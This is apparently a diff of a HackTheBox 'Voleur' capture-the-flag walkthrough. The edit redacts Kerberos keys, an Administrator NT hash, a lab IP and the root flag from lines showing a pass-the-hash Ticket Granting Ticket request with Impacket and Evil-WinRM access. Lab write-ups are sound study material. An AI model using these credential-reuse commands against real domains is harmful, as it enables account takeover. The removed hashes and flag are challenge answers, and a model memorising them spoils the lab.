-voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
-voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
-voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
-voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
+Administrator:aes256-cts-hmac-sha1-96:<SNIP>
+Administrator:aes128-cts-hmac-sha1-96:<SNIP>
+Administrator:des-cbc-md5:<SNIP>
+<SNIP>
 ```
 
 Got the `Administrator` hash. <br>
 &rarr; Let's request the **Ticket Granting Ticket** for `Administrator` user.
 
 ```bash
-└─$ getTGT.py -dc-ip 10.129.98.35 'voleur.htb/Administrator' -hashes :e656e07c56d831611b577b160b259ad2
+└─$ getTGT.py -dc-ip 10.129.xx.xx 'voleur.htb/Administrator' -hashes :<SNIP>
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in Administrator.ccache
@@ -1136,7 +1068,7 @@ Mode                 LastWriteTime         Length Name
 
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
-58b2cadb9fe8745d4c516baa59980518
+58b2caxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Grab the `root.txt` flag.
